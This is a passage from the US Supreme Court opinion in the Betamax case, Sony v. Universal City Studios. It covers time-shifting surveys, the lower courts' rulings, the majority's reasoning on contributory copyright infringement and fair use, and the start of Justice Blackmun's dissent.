8 The respondents and Sony both conducted surveys of the way the Betamax machine was used by several hundred owners during a sample period in 1978 .
Although there were some differences in the surveys , they both showed that the primary use of the machine for most owners was " time - shifting , " — the practice of recording a program to view it once at a later time , and thereafter erasing it .
Time - shifting enables viewers to see programs they otherwise would miss because they are not at home , are occupied with other tasks , or are viewing a program on another station at the time of a broadcast that they desire to watch .
Both surveys also showed , however , that a substantial number of interviewees had accumulated libraries of tapes .
Sony 's survey indicated that over 80 % of the interviewees watched at least as much regular television as they had before owning a Betamax .
Respondents offered no evidence of decreased television viewing by Betamax owners .
9 Sony introduced considerable evidence describing television programs that could be copied without objection from any copyright holder , with special emphasis on sports , religious , and educational programming .
For example , their survey indicated that 7.3 % of all Betamax use is to record sports events , and representatives of professional baseball , football , basketball , and hockey testified that they had no objection to the recording of their televised events for home use .
10 Respondents offered opinion evidence concerning the future impact of the unrestricted sale of VTR's on the commercial value of their copyrights .
The District Court found , however , that they had failed to prove any likelihood of future harm from the use of VTR 's for time - shifting .
Id. , at 469 .
The District Court's Decision
11 The lengthy trial of the case in the District Court concerned the private , home use of VTR's for recording programs broadcast on the public airwaves without charge to the viewer .
No issue concerning the transfer of tapes to other persons , the use of home - recorded tapes for public performances , or the copying of programs transmitted on pay or cable television systems was raised .
See 480 F.Supp. 429 , 432-433 , 442 ( 1979 ) .
12 The District Court concluded that noncommercial home use recording of material broadcast over the public airwaves was a fair use of copyrighted works and did not constitute copyright infringement .
It emphasized the fact that the material was broadcast free to the public at large , the noncommercial character of the use , and the private character of the activity conducted entirely within the home .
Moreover , the court found that the purpose of this use served the public interest in increasing access to television programming , an interest that " is consistent with the First Amendment policy of providing the fullest possible access to information through the public airwaves .
Columbia Broadcasting System , Inc. v. Democratic National Committee , 412 U.S. 94 , 102 [ 93 S.Ct. 2080 , 2086 , 36 L.Ed.2d 772 ] . " 480 F.Supp. , at 454 .
Even when an entire copyrighted work was recorded , the District Court regarded the copying as fair use " because there is no accompanying reduction in the market for ' plaintiff 's original work . ' " Ibid .
13 As an independent ground of decision , the District Court also concluded that Sony could not be held liable as a contributory infringer even if the home use of a VTR was considered an infringing use .
The District Court noted that Sony had no direct involvement with any Betamax purchasers who recorded copyrighted works off the air .
Sony 's advertising was silent on the subject of possible copyright infringement , but its instruction booklet contained the following statement :
14 " Television programs , films , videotapes and other materials may be copyrighted .
Unauthorized recording of such material may be contrary to the provisions of the United States copyright laws . "
Id. , at 436 .
15 The District Court assumed that Sony had constructive knowledge of the probability that the Betamax machine would be used to record copyrighted programs , but found that Sony merely sold a " product capable of a variety of uses , some of them allegedly infringing . "
Id. , at 461 .
It reasoned :
16 " Selling a staple article of commerce e.g. , a typewriter , a recorder , a camera , a photocopying machine technically contributes to any infringing use subsequently made thereof , but this kind of ' contribution , ' if deemed sufficient as a basis for liability , would expand the theory beyond precedent and arguably beyond judicial management .
17 " Commerce would indeed be hampered if manufacturers of staple items were held liable as contributory infringers whenever they ' constructively ' knew that some purchasers on some occasions would use their product for a purpose which a court later deemed , as a matter of first impression , to be an infringement . "
Ibid .
18 Finally , the District Court discussed the respondents ' prayer for injunctive relief , noting that they had asked for an injunction either preventing the future sale of Betamax machines , or requiring that the machines be rendered incapable of recording copyrighted works off the air .
The court stated that it had " found no case in which the manufacturers , distributors , retailers , and advertisors of the instrument enabling the infringement were sued by the copyright holders , " and that the request for relief in this case " is unique . "
480 F.Supp. , at 465 .
19 It concluded that an injunction was wholly inappropriate because any possible harm to respondents was outweighed by the fact that " the Betamax could still legally be used to record noncopyrighted material or material whose owners consented to the copying .
An injunction would deprive the public of the ability to use the Betamax for this noninfringing off - the - air recording . "
480 F.Supp. , at 468 .
The Court of Appeals ' Decision
20 The Court of Appeals reversed the District Court 's judgment on respondents ' copyright claim .
It did not set aside any of the District Court 's findings of fact .
Rather , it concluded as a matter of law that the home use of a VTR was not a fair use because it was not a " productive use . "
It therefore held that it was unnecessary for plaintiffs to prove any harm to the potential market for the copyrighted works , but then observed that it seemed clear that the cumulative effect of mass reproduction made possible by VTR's would tend to diminish the potential market for respondents ' works .
659 F.2d , at 974 .
21 On the issue of contributory infringement , the Court of Appeals first rejected the analogy to staple articles of commerce such as tape recorders or photocopying machines .
It noted that such machines " may have substantial benefit for some purposes " and do not " even remotely raise copyright problems . "
Id. , at 975 .
VTR's , however , are sold " for the primary purpose of reproducing television programming " and " virtually all " such programming is copyrighted material .
Ibid .
The Court of Appeals concluded , therefore , that VTR's were not suitable for any substantial noninfringing use even if some copyright owners elect not to enforce their rights .
22 The Court of Appeals also rejected the District Court 's reliance on Sony 's lack of knowledge that home use constituted infringement .
Assuming that the statutory provisions defining the remedies for infringement applied also to the non-statutory tort of contributory infringement , the court stated that a defendant 's good faith would merely reduce his damages liability but would not excuse the infringing conduct .
It held that Sony was chargeable with knowledge of the homeowner 's infringing activity because the reproduction of copyrighted materials was either " the most conspicuous use " or " the major use " of the Betamax product .
Ibid .
23 On the matter of relief , the Court of Appeals concluded that " statutory damages may be appropriate , " that the District Court should reconsider its determination that an injunction would not be an appropriate remedy ; and , referring to " the analogous photocopying area , " suggested that a continuing royalty pursuant to a judicially created compulsory license may very well be an acceptable resolution of the relief issue .
659 F.2d , at 976 .
II
24 Article I , Sec. 8 of the Constitution provides that :
25 " The Congress shall have Power . . . to Promote the Progress of Science and useful Arts , by securing for limited Times to Authors and Inventors the exclusive Right to their respective Writings and Discoveries . "
The monopoly privileges that Congress may authorize are neither unlimited nor primarily designed to provide a special private benefit .
Rather , the limited grant is a means by which an important public purpose may be achieved .
It is intended to motivate the creative activity of authors and inventors by the provision of a special reward , and to allow the public access to the products of their genius after the limited period of exclusive control has expired .
26 " The copyright law , like the patent statute , makes reward to the owner a secondary consideration .
In Fox Film Corp. v. Doyal , 286 U.S. 123 , 127 [ 52 S.Ct. 546 , 547 , 76 L.Ed. 1010 ] , Chief Justice Hughes spoke as follows respecting the copyright monopoly granted by Congress , ' The sole interest of the United States and the primary object in conferring the monopoly lie in the general benefits derived by the public from the labors of authors . '
It is said that reward to the author or artist serves to induce release to the public of the products of his creative genius . "
United States v. Paramount Pictures , 334 U.S. 131 , 158 , 68 S.Ct. 915 , 929 , 92 L.Ed. 1260 .
27 As the text of the Constitution makes plain , it is Congress that has been assigned the task of defining the scope of the limited monopoly that should be granted to authors or to inventors in order to give the public appropriate access to their work product .
Because this task involves a difficult balance between the interests of authors and inventors in the control and exploitation of their writings and discoveries on the one hand , and society 's competing interest in the free flow of ideas , information , and commerce on the other hand , our patent and copyright statutes have been amended repeatedly .
28 From its beginning , the law of copyright has developed in response to significant changes in technology .
Indeed , it was the invention of a new form of copying equipment — the printing press — that gave rise to the original need for copyright protection .
Repeatedly , as new developments have occurred in this country , it has been the Congress that has fashioned the new rules that new technology made necessary .
Thus , long before the enactment of the Copyright Act of 1909 , 35 Stat .
1075 , it was settled that the protection given to copyrights is wholly statutory .
Wheaton v. Peters , 33 U.S. ( 8 Peters ) 591 , 661-662 , 8 L.Ed. 1055 ( 1834 ) .
The remedies for infringement " are only those prescribed by Congress . "
Thompson v. Hubbard , 131 U.S. 123 , 151 , 9 S.Ct. 710 , 720 , 33 L.Ed. 76 ( 1889 ) .
29 The judiciary 's reluctance to expand the protections afforded by the copyright without explicit legislative guidance is a recurring theme .
See , e.g. , Teleprompter Corp. v. CBS , 415 U.S. 394 , 94 S.Ct. 1129 , 39 L.Ed.2d 415 ( 1974 ) ; Fortnightly Corp. v. United Artists , 392 U.S. 390 , 88 S.Ct. 2084 , 20 L.Ed.2d 1176 ( 1968 ) ; White - Smith Music Publishing Co. v. Apollo Co. , 209 U.S. 1 , 28 S.Ct. 319 , 52 L.Ed. 655 ( 1908 ) ; Williams and Wilkins v. United States , 487 F.2d 1345 , 203 Ct.Cl. 74 ( 1973 ) , affirmed by an equally divided court , 420 U.S. 376 , 95 S.Ct. 1344 , 43 L.Ed.2d 264 ( 1975 ) .
Sound policy , as well as history , supports our consistent deference to Congress when major technological innovations alter the market for copyrighted materials .
Congress has the constitutional authority and the institutional ability to accommodate fully the varied permutations of competing interests that are inevitably implicated by such new technology .
30 In a case like this , in which Congress has not plainly marked our course , we must be circumspect in construing the scope of rights created by a legislative enactment which never contemplated such a calculus of interests .
In doing so , we are guided by Justice Stewart 's exposition of the correct approach to ambiguities in the law of copyright :
31 " The limited scope of the copyright holder 's statutory monopoly , like the limited copyright duration required by the Constitution , reflects a balance of competing claims upon the public interest : Creative work is to be encouraged and rewarded , but private motivation must ultimately serve the cause of promoting broad public availability of literature , music , and the other arts .
The immediate effect of our copyright law is to secure a fair return for an ' author 's ' creative labor .
But the ultimate aim is , by this incentive , to stimulate artistic creativity for the general public good .
' The sole interest of the United States and the primary object in conferring the monopoly , ' this Court has said , 'lie in the general benefits derived by the public from the labors of authors . '
Fox Film Corp. v. Doyal , 286 U.S. 123 , 127 [ 52 S.Ct. 546 , 547 , 76 L.Ed. 1010 ] .
See Kendall v. Winsor , 21 How .
322 , 327-328 [ 16 L.Ed. 165 ] ; Grant v. Raymond , 6 Pet. 218 , 241-242 [ 8 L.Ed. 376 ] .
When technological change has rendered its literal terms ambiguous , the Copyright Act must be construed in light of this basic purpose . "
Twentieth Century Music Corp. v. Aiken , 422 U.S. 151 , 156 , 95 S.Ct. 2040 , 2043 , 45 L.Ed.2d 84 ( footnotes omitted ) .
32 Copyright protection " subsists . . . in original works of authorship fixed in any tangible medium of expression . "
17 U.S.C. § 102 ( a ) .
This protection has never accorded the copyright owner complete control over all possible uses of his work .
Rather , the Copyright Act grants the copyright holder " exclusive " rights to use and to authorize the use of his work in five qualified ways , including reproduction of the copyrighted work in copies .
Id. , § 106 .
All reproductions of the work , however , are not within the exclusive domain of the copyright owner ; some are in the public domain .
Any individual may reproduce a copyrighted work for a " fair use ; " the copyright owner does not possess the exclusive right to such a use .
Compare id. , § 106 with id. , § 107 .
33 " Anyone who violates any of the exclusive rights of the copyright owner , " that is , anyone who trespasses into his exclusive domain by using or authorizing the use of the copyrighted work in one of the five ways set forth in the statute , " is an infringer of the copyright . "
Id. , § 501 ( a ) .
Conversely , anyone who is authorized by the copyright owner to use the copyrighted work in a way specified in the statute or who makes a fair use of the work is not an infringer of the copyright with respect to such use .
34 The Copyright Act provides the owner of a copyright with a potent arsenal of remedies against an infringer of his work , including an injunction to restrain the infringer from violating his rights , the impoundment and destruction of all reproductions of his work made in violation of his rights , a recovery of his actual damages and any additional profits realized by the infringer or a recovery of statutory damages , and attorneys fees .
Id. , §§ 502-505 .
35 The two respondents in this case do not seek relief against the Betamax users who have allegedly infringed their copyrights .
Moreover , this is not a class action on behalf of all copyright owners who license their works for television broadcast , and respondents have no right to invoke whatever rights other copyright holders may have to bring infringement actions based on Betamax copying of their works .
As was made clear by their own evidence , the copying of the respondents ' programs represents a small portion of the total use of VTR's .
It is , however , the taping of respondents own copyrighted programs that provides them with standing to charge Sony with contributory infringement .
To prevail , they have the burden of proving that users of the Betamax have infringed their copyrights and that Sony should be held responsible for that infringement .
III
36 The Copyright Act does not expressly render anyone liable for infringement committed by another .
In contrast , the Patent Act expressly brands anyone who " actively induces infringement of a patent " as an infringer , 35 U.S.C. § 271 ( b ) , and further imposes liability on certain individuals labeled " contributory " infringers , id. , § 271 ( c ) .
The absence of such express language in the copyright statute does not preclude the imposition of liability for copyright infringements on certain parties who have not themselves engaged in the infringing activity .
For vicarious liability is imposed in virtually all areas of the law , and the concept of contributory infringement is merely a species of the broader problem of identifying the circumstances in which it is just to hold one individual accountable for the actions of another .
37 Such circumstances were plainly present in Kalem Co. v. Harper Brothers , 222 U.S. 55 , 32 S.Ct. 20 , 56 L.Ed. 92 ( 1911 ) , the copyright decision of this Court on which respondents place their principal reliance .
In Kalem , the Court held that the producer of an unauthorized film dramatization of the copyrighted book Ben Hur was liable for his sale of the motion picture to jobbers , who in turn arranged for the commercial exhibition of the film .
Justice Holmes , writing for the Court , explained :
38 " The defendant not only expected but invoked by advertisement the use of its films for dramatic reproduction of the story .
That was the most conspicuous purpose for which they could be used , and the one for which especially they were made .
If the defendant did not contribute to the infringement it is impossible to do so except by taking part in the final act .
It is liable on principles recognized in every part of the law . "
222 U.S. , at 63 , 32 S.Ct. , at 22 .
39 The use for which the item sold in Kalem had been " especially " made was , of course , to display the performance that had already been recorded upon it .
The producer had personally appropriated the copyright owner 's protected work and , as the owner of the tangible medium of expression upon which the protected work was recorded , authorized that use by his sale of the film to jobbers .
But that use of the film was not his to authorize : the copyright owner possessed the exclusive right to authorize public performances of his work .
Further , the producer personally advertised the unauthorized public performances , dispelling any possible doubt as to the use of the film which he had authorized .
40 Respondents argue that Kalem stands for the proposition that supplying the " means " to accomplish an infringing activity and encouraging that activity through advertisement are sufficient to establish liability for copyright infringement .
This argument rests on a gross generalization that cannot withstand scrutiny .
The producer in Kalem did not merely provide the " means " to accomplish an infringing activity ; the producer supplied the work itself , albeit in a new medium of expression .
Petitioners in the instant case do not supply Betamax consumers with respondents ' works ; respondents do .
Petitioners supply a piece of equipment that is generally capable of copying the entire range of programs that may be televised : those that are uncopyrighted , those that are copyrighted but may be copied without objection from the copyright holder , and those that the copyright holder would prefer not to have copied .
The Betamax can be used to make authorized or unauthorized uses of copyrighted works , but the range of its potential use is much broader than the particular infringing use of the film Ben Hur involved in Kalem .
Kalem does not support respondents ' novel theory of liability .
41 Justice Holmes stated that the producer had " contributed " to the infringement of the copyright , and the label " contributory infringement " has been applied in a number of lower court copyright cases involving an ongoing relationship between the direct infringer and the contributory infringer at the time the infringing conduct occurred .
In such cases , as in other situations in which the imposition of vicarious liability is manifestly just , the " contributory " infringer was in a position to control the use of copyrighted works by others and had authorized the use without permission from the copyright owner .
This case , however , plainly does not fall in that category .
The only contact between Sony and the users of the Betamax that is disclosed by this record occurred at the moment of sale .
The District Court expressly found that " no employee of Sony , Sonam or DDBI had either direct involvement with the allegedly infringing activity or direct contact with purchasers of Betamax who recorded copyrighted works off - the - air . "
480 F.Supp. , at 460 .
And it further found that " there was no evidence that any of the copies made by Griffiths or the other individual witnesses in this suit were influenced or encouraged by [ Sony 's ] advertisements . "
Ibid .
If vicarious liability is to be imposed on petitioners in this case , it must rest on the fact that they have sold equipment with constructive knowledge of the fact that their customers may use that equipment to make unauthorized copies of copyrighted material .
There is no precedent in the law of copyright for the imposition of vicarious liability on such a theory .
The closest analogy is provided by the patent law cases to which it is appropriate to refer because of the historic kinship between patent law and copyright law .
42 In the Patent Code both the concept of infringement and the concept of contributory infringement are expressly defined by statute .
The prohibition against contributory infringement is confined to the knowing sale of a component especially made for use in connection with a particular patent .
There is no suggestion in the statute that one patentee may object to the sale of a product that might be used in connection with other patents .
Moreover , the Act expressly provides that the sale of a " staple article or commodity of commerce suitable for substantial noninfringing use " is not contributory infringement .
43 When a charge of contributory infringement is predicated entirely on the sale of an article of commerce that is used by the purchaser to infringe a patent , the public interest in access to that article of commerce is necessarily implicated .
A finding of contributory infringement does not , of course , remove the article from the market altogether ; it does , however , give the patentee effective control over the sale of that item .
Indeed , a finding of contributory infringement is normally the functional equivalent of holding that the disputed article is within the monopoly granted to the patentee .
44 For that reason , in contributory infringement cases arising under the patent laws the Court has always recognized the critical importance of not allowing the patentee to extend his monopoly beyond the limits of his specific grant .
These cases deny the patentee any right to control the distribution of unpatented articles unless they are " unsuited for any commercial noninfringing use . "
Dawson Chemical Co. v. Rohm & Hass Co. , 448 U.S. 176 , 198 , 100 S.Ct. 2601 , 2614 , 65 L.Ed.2d 696 ( 1980 ) .
Unless a commodity " has no use except through practice of the patented method , " ibid , the patentee has no right to claim that its distribution constitutes contributory infringement .
" To form the basis for contributory infringement the item must almost be uniquely suited as a component of the patented invention . "
P. Rosenberg , Patent Law Fundamentals § 17.02 [ 2 ] ( 1982 ) . " [ A ] sale of an article which though adapted to an infringing use is also adapted to other and lawful uses , is not enough to make the seller a contributory infringer .
Such a rule would block the wheels of commerce . "
Henry v. A.B. Dick Co. , 224 U.S. 1 , 48 , 32 S.Ct. 364 , 379 , 56 L.Ed. 645 ( 1912 ) , overruled on other grounds , Motion Picture Patents Co. v. Universal Film Mfg. Co. , 243 U.S. 502 , 517 , 37 S.Ct. 416 , 421 , 61 L.Ed. 871 ( 1917 ) .
45 We recognize there are substantial differences between the patent and copyright laws .
But in both areas the contributory infringement doctrine is grounded on the recognition that adequate protection of a monopoly may require the courts to look beyond actual duplication of a device or publication to the products or activities that make such duplication possible .
The staple article of commerce doctrine must strike a balance between a copyright holder 's legitimate demand for effective — not merely symbolic — protection of the statutory monopoly , and the rights of others freely to engage in substantially unrelated areas of commerce .
Accordingly , the sale of copying equipment , like the sale of other articles of commerce , does not constitute contributory infringement if the product is widely used for legitimate , unobjectionable purposes .
Indeed , it need merely be capable of substantial noninfringing uses .
IV
46 The question is thus whether the Betamax is capable of commercially significant noninfringing uses .
In order to resolve that question , we need not explore all the different potential uses of the machine and determine whether or not they would constitute infringement .
Rather , we need only consider whether on the basis of the facts as found by the district court a significant number of them would be non-infringing .
Moreover , in order to resolve this case we need not give precise content to the question of how much use is commercially significant .
For one potential use of the Betamax plainly satisfies this standard , however it is understood : private , noncommercial time - shifting in the home .
It does so both ( A ) because respondents have no right to prevent other copyright holders from authorizing it for their programs , and ( B ) because the District Court 's factual findings reveal that even the unauthorized home time - shifting of respondents ' programs is legitimate fair use .
A. Authorized Time Shifting
47 Each of the respondents owns a large inventory of valuable copyrights , but in the total spectrum of television programming their combined market share is small .
The exact percentage is not specified , but it is well below 10 % .
If they were to prevail , the outcome of this litigation would have a significant impact on both the producers and the viewers of the remaining 90 % of the programming in the Nation .
No doubt , many other producers share respondents ' concern about the possible consequences of unrestricted copying .
Nevertheless the findings of the District Court make it clear that time - shifting may enlarge the total viewing audience and that many producers are willing to allow private time - shifting to continue , at least for an experimental time period .
The District Court found :
48 " Even if it were deemed that home - use recording of copyrighted material constituted infringement , the Betamax could still legally be used to record noncopyrighted material or material whose owners consented to the copying .
An injunction would deprive the public of the ability to use the Betamax for this noninfringing off - the - air recording .
" Defendants introduced considerable testimony at
49 trial about the potential for such copying of sports , religious , educational and other programming .
This included testimony from representatives of the Offices of the Commissioners of the National Football , Basketball , Baseball and Hockey Leagues and Associations , the Executive Director of National Religious Broadcasters and various educational communications agencies .
Plaintiffs attack the weight of the testimony offered and also contend that an injunction is warranted because infringing uses outweigh noninfringing uses . "
50 " Whatever the future percentage of legal versus illegal home - use recording might be , an injunction which seeks to deprive the public of the very tool or article of commerce capable of some noninfringing use would be an extremely harsh remedy , as well as one unprecedented in copyright law . "
480 F.Supp. , at 468 .
51 Although the District Court made these statements in the context of considering the propriety of injunctive relief , the statements constitute a finding that the evidence concerning " sports , religious , educational , and other programming " was sufficient to establish a significant quantity of broadcasting whose copying is now authorized , and a significant potential for future authorized copying .
That finding is amply supported by the record .
In addition to the religious and sports officials identified explicitly by the District Court , two items in the record deserve specific mention .
52 First is the testimony of John Kenaston , the station manager of Channel 58 , an educational station in Los Angeles affiliated with the Public Broadcasting Service .
He explained and authenticated the station 's published guide to its programs .
For each program , the guide tells whether unlimited home taping is authorized , home taping is authorized subject to certain restrictions ( such as erasure within seven days ) , or home taping is not authorized at all .
The Spring 1978 edition of the guide described 107 programs .
Sixty - two of those programs or 58 % authorize some home taping .
Twenty - one of them or almost 20 % authorize unrestricted home taping .
53 Second is the testimony of Fred Rogers , president of the corporation that produces and owns the copyright on Mr. Rogers ' Neighborhood .
The program is carried by more public television stations than any other program .
Its audience numbers over 3,000,000 families a day .
He testified that he had absolutely no objection to home taping for noncommercial use and expressed the opinion that it is a real service to families to be able to record children 's programs and to show them at appropriate times .
54 If there are millions of owners of VTR's who make copies of televised sports events , religious broadcasts , and educational programs such as Mister Rogers ' Neighborhood , and if the proprietors of those programs welcome the practice , the business of supplying the equipment that makes such copying feasible should not be stifled simply because the equipment is used by some individuals to make unauthorized reproductions of respondents ' works .
The respondents do not represent a class composed of all copyright holders .
Yet a finding of contributory infringement would inevitably frustrate the interests of broadcasters in reaching the portion of their audience that is available only through time - shifting .
55 Of course , the fact that other copyright holders may welcome the practice of time - shifting does not mean that respondents should be deemed to have granted a license to copy their programs .
Third party conduct would be wholly irrelevant in an action for direct infringement of respondents ' copyrights .
But in an action for contributory infringement against the seller of copying equipment , the copyright holder may not prevail unless the relief that he seeks affects only his programs , or unless he speaks for virtually all copyright holders with an interest in the outcome .
In this case , the record makes it perfectly clear that there are many important producers of national and local television programs who find nothing objectionable about the enlargement in the size of the television audience that results from the practice of time - shifting for private home use .
The seller of the equipment that expands those producers ' audiences cannot be a contributory infringer if , as is true in this case , it has had no direct involvement with any infringing activity .
56 Even unauthorized uses of a copyrighted work are not necessarily infringing .
An unlicensed use of the copyright is not an infringement unless it conflicts with one of the specific exclusive rights conferred by the copyright statute .
Twentieth Century Music Corp. v. Aiken , 422 U.S. 151 , 154-155 , 95 S.Ct. 2040 , 2043 , 45 L.Ed.2d 84 .
Moreover , the definition of exclusive rights in § 106 of the present
Act is prefaced by the words " subject to sections 107 through 118 . "
Those sections describe a variety of uses of copyrighted material that " are not infringements of copyright notwithstanding the provisions of § 106 . "
The most pertinent in this case is § 107 , the legislative endorsement of the doctrine of " fair use . "
57 That section identifies various factors that enable a Court to apply an " equitable rule of reason " analysis to particular claims of infringement .
Although not conclusive , the first factor requires that " the commercial or nonprofit character of an activity " be weighed in any fair use decision .
If the Betamax were used to make copies for a commercial or profit - making purpose , such use would presumptively be unfair .
The contrary presumption is appropriate here , however , because the District Court 's findings plainly establish that time - shifting for private home use must be characterized as a noncommercial , nonprofit activity .
Moreover , when one considers the nature of a televised copyrighted audiovisual work , see 17 U.S.C. § 107 ( 2 ) , and that timeshifting merely enables a viewer to see such a work which he had been invited to witness in its entirety free of charge , the fact that the entire work is reproduced , see id. , at § 107 ( 3 ) , does not have its ordinary effect of militating against a finding of fair use .
58 This is not , however , the end of the inquiry because Congress has also directed us to consider " the effect of the use upon the potential market for or value of the copyrighted work . "
Id. , at § 107 ( 4 ) .
The purpose of copyright is to create incentives for creative effort .
Even copying for noncommercial purposes may impair the copyright holder 's ability to obtain the rewards that Congress intended him to have .
But a use that has no demonstrable effect upon the potential market for , or the value of , the copyrighted work need not be prohibited in order to protect the author 's incentive to create .
The prohibition of such noncommercial uses would merely inhibit access to ideas without any countervailing benefit .
59 Thus , although every commercial use of copyrighted material is presumptively an unfair exploitation of the monopoly privilege that belongs to the owner of the copyright , noncommercial uses are a different matter .
A challenge to a noncommercial use of a copyrighted work requires proof either that the particular use is harmful , or that if it should become widespread , it would adversely affect the potential market for the copyrighted work .
Actual present harm need not be shown ; such a requirement would leave the copyright holder with no defense against predictable damage .
Nor is it necessary to show with certainty that future harm will result .
What is necessary is a showing by a preponderance of the evidence that some meaningful likelihood of future harm exists .
If the intended use is for commercial gain , that likelihood may be presumed .
But if it is for a noncommercial purpose , the likelihood must be demonstrated .
60 In this case , respondents failed to carry their burden with regard to home time - shifting .
The District Court described respondents ' evidence as follows :
61 " Plaintiffs ' experts admitted at several points in the trial that the time - shifting without librarying would result in ' not a great deal of harm . '
Plaintiffs ' greatest concern about time - shifting is with 'a point of important philosophy that transcends even commercial judgment . '
They fear that with any Betamax usage , ' invisible boundaries ' are passed : ' the copyright owner has lost control over his program . ' " 480 F.Supp. , at 467 .
62 Later in its opinion , the District Court observed :
63 " Most of plaintiffs ' predictions of harm hinge on speculation about audience viewing patterns and ratings , a measurement system which Sidney Sheinberg , MCA 's president , calls a ' black art ' because of the significant level of imprecision involved in the calculations . "
Id. , at 469 .
64 There was no need for the District Court to say much about past harm .
" Plaintiffs have admitted that no actual harm to their copyrights has occurred to date . "
Id. , at 451 .
65 On the question of potential future harm from time - shifting , the District Court offered a more detailed analysis of the evidence .
It rejected respondents ' " fear that persons ' watching ' the original telecast of a program will not be measured in the live audience and the ratings and revenues will decrease , " by observing that current measurement technology allows the Betamax audience to be reflected .
Id. , at 466 .
It rejected respondents ' prediction " that live television or movie audiences will decrease as more people watch Betamax tapes as an alternative , " with the observation that " [t ] here is no factual basis for [ the underlying ] assumption . "
Ibid .
It rejected respondents ' " fear that time - shifting will reduce audiences for telecast reruns , " and concluded instead that " given current market practices , this should aid plaintiffs rather than harm them . "
Ibid .
And it declared that respondents ' suggestion " that theater or film rental exhibition of a program will suffer because of time - shift recording of that program " " lacks merit . "
480 F.Supp. , at 467 .
66 After completing that review , the District Court restated its overall conclusion several times , in several different ways .
" Harm from time - shifting is speculative and , at best , minimal . "
Ibid .
" The audience benefits from the time - shifting capability have already been discussed .
It is not implausible that benefits could also accrue to plaintiffs , broadcasters , and advertisers , as the Betamax makes it possible for more persons to view their broadcasts . "
Ibid .
" No likelihood of harm was shown at trial , and plaintiffs admitted that there had been no actual harm to date . "
Id. , at 468-469 .
" Testimony at trial suggested that Betamax may require adjustments in marketing strategy , but it did not establish even a likelihood of harm . "
Id. , at 469 .
" Television production by plaintiffs today is more profitable than it has ever been , and , in five weeks of trial , there was no concrete evidence to suggest that the Betamax will change the studios ' financial picture . "
Ibid .
67 The District Court 's conclusions are buttressed by the fact that to the extent time - shifting expands public access to freely broadcast television programs , it yields societal benefits .
Earlier this year , in Community Television of Southern California v. Gottfried , --- U.S. ----, ---- - ---- , n. 12 , 103 S.Ct. 885 , 891-892 , 74 L.Ed.2d 705 ( 1983 ) , we acknowledged the public interest in making television broadcasting more available .
Concededly , that interest is not unlimited .
But it supports an interpretation of the concept of " fair use " that requires the copyright holder to demonstrate some likelihood of harm before he may condemn a private act of time - shifting as a violation of federal law .
68 When these factors are all weighed in the " equitable rule of reason " balance , we must conclude that this record amply supports the District Court 's conclusion that home time - shifting is fair use .
In light of the findings of the District Court regarding the state of the empirical data , it is clear that the Court of Appeals erred in holding that the statute as presently written bars such conduct .
69 In summary , the record and findings of the District Court lead us to two conclusions .
First ,
Sony demonstrated a significant likelihood that substantial numbers of copyright holders who license their works for broadcast on free television would not object to having their broadcasts time - shifted by private viewers .
And second , respondents failed to demonstrate that time - shifting would cause any likelihood of nonminimal harm to the potential market for , or the value of , their copyrighted works .
The Betamax is , therefore , capable of substantial noninfringing uses .
Sony 's sale of such equipment to the general public does not constitute contributory infringement of respondent 's copyrights .
V
70 " The direction of Art. I is that Congress shall have the power to promote the progress of science and the useful arts .
When , as here , the Constitution is permissive , the sign of how far Congress has chosen to go can come only from Congress . "
Deepsouth Packing Co. v. Laitram Corp. , 406 U.S. 518 , 530 , 92 S.Ct. 1700 , 1707 , 32 L.Ed.2d 273 ( 1972 ) .
71 One may search the Copyright Act in vain for any sign that the elected representatives of the millions of people who watch television every day have made it unlawful to copy a program for later viewing at home , or have enacted a flat prohibition against the sale of machines that make such copying possible .
72 It may well be that Congress will take a fresh look at this new technology , just as it so often has examined other innovations in the past .
But it is not our job to apply laws that have not yet been written .
Applying the copyright statute , as it now reads , to the facts as they have been developed in this case , the judgment of the Court of Appeals must be reversed .
73 It is so ordered .
Justice BLACKMUN , with whom Justice MARSHALL , Justice POWELL , and Justice REHNQUIST join , dissenting .
74 A restatement of the facts and judicial history of this case is necessary , in my view , for a proper focus upon the issues .
Respondents ' position is hardly so " unprecedented , " ante , at 421 , in the copyright law , nor does it really embody a " gross generalization , " ante , at 436 , or a " novel theory of liability , " ante , at 437 , and the like , as the Court , in belittling their claims , describes the efforts of respondents .
75 * The introduction of the home videotape recorder ( VTR ) upon the market has enabled millions of Americans to make recordings of television programs in their homes , for future and repeated viewing at their own convenience .
While this practice has proved highly popular with owners of television sets and VTRs , it understandably has been a matter of concern for the holders of copyrights in the recorded programs .
A result is the present litigation , raising the issues whether the home recording of a copyrighted television program is an infringement of the copyright , and , if so , whether the manufacturers and distributors of VTRs are liable as contributory infringers .
I would hope that these questions ultimately will be considered seriously and in depth by the Congress and be resolved there , despite the fact that the Court 's decision today provides little incentive for congressional action .
Our task in the meantime , however , is to resolve these issues as best we can in the light of ill - fitting existing copyright law .
76 It is no answer , of course , to say and stress , as the Court does , this Court 's " consistent deference to Congress " whenever " major technological innovations " appear .
Ante , at 431 .
Perhaps a better and more accurate description is that the Court has tended to evade the hard issues when they arise in the area of copyright law .
I see no reason for the Court to be particularly pleased with this tradition or to continue it .
Indeed , it is fairly clear from the legislative history of the 1976 Act that Congress meant to change the old pattern and enact a statute that would cover new technologies , as well as old .

77 In 1976 , respondents Universal City Studios , Inc. , and Walt Disney Productions ( Studios ) brought this copyright infringement action in the United States District Court for the Central District of California against , among others , petitioners Sony Corporation , a Japanese corporation , and Sony Corporation of America , a New York corporation , the manufacturer and distributor , respectively , of the Betamax VTR .
The Studios sought damages , profits , and a wide - ranging injunction against further sales or use of the Betamax or Betamax tapes .
78 The Betamax , like other VTRs , presently is capable of recording television broadcasts off the air on videotape cassettes , and playing them back at a later time .
Two kinds of Betamax usage are at issue here .
The first is " time - shifting , " whereby the user records a program in order to watch it at a later time , and then records over it , and thereby erases the program , after a single viewing .
The second is " library - building , " in which the user records a program in order to keep it for repeated viewing over a longer term .
Sony 's advertisements , at various times , have suggested that Betamax users " record favorite shows " or " build a library . "
Sony 's Betamax advertising has never contained warnings about copyright infringement , although a warning does appear in the Betamax operating instructions .
79 The Studios produce copyrighted " movies " and other works that they release to theaters and license for television broadcast .
They also rent and sell their works on film and on prerecorded videotapes and videodiscs .
License fees for television broadcasts are set according to audience ratings , compiled by rating services that do not measure any playbacks of videotapes .
The Studios make the serious claim that VTR recording may result in a decrease in their revenue from licensing their works to television and from marketing them in other ways .
80 After a 5 - week trial , the District Court , with a detailed opinion , ruled that home VTR recording did not infringe the Studios ' copyrights under either the Act of March 4 , 1909 ( 1909 Act ) , 35 Stat.
